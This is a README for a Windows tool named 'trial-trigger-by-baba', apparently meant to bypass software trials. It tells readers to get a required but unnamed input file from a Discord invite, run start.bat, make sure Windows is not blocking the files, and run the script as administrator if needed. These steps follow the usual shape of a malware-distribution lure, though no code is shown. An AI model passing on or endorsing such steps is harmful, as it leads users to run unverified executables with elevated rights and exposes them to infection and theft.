## 📥 Download

You can download the project for free directly from GitHub.

1. Open this repository.
2. Click the green **Code** button.
3. Select **Download ZIP**.
4. Wait for the download to finish.
5. Right-click the downloaded ZIP.
6. Select **Extract All**.
7. Open the extracted folder.

> ⚠️ Always extract the complete archive before starting the program.

---

## 📁 Required Files

Before running the tool, make sure:

* All ZIP files have been extracted.
* The complete project folder is available.
* The required input file has been added.
* You have downloaded the missing input file from the Discord server.
* `start.bat` is inside the project folder.

If a required file is missing, the program may not start correctly.

## ⚙️ Installation

Installation is simple.

### Step 1 — Extract the Project

Extract the downloaded ZIP into a normal folder.

Example:

```text
Desktop/
└── trial-trigger-by-baba/
```

Do not launch the program while it is still compressed.

### Step 2 — Add the Required Input File

Join:

```text
https://discord.gg/HfnssEfHG
```

Download the required input file and place it in the correct project directory according to the instructions provided there.

### Step 3 — Run `start.bat`

Double-click:

```bat
start.bat
```

The startup script will handle the normal installation/startup process for the project.

If dependencies are not installed yet, allow the setup process to complete.

## 🛠️ If `start.bat` Does Not Work

Make sure:

* The ZIP has been fully extracted.
* You are running `start.bat` from the extracted folder.
* Required dependencies are installed.
* The missing input file has been added.
* Windows is not blocking the project files.
* You did not rename or remove required project files.

You can also try:

```text
Right Click start.bat
→ Run as administrator
```

only if normal startup requires additional Windows permissions.
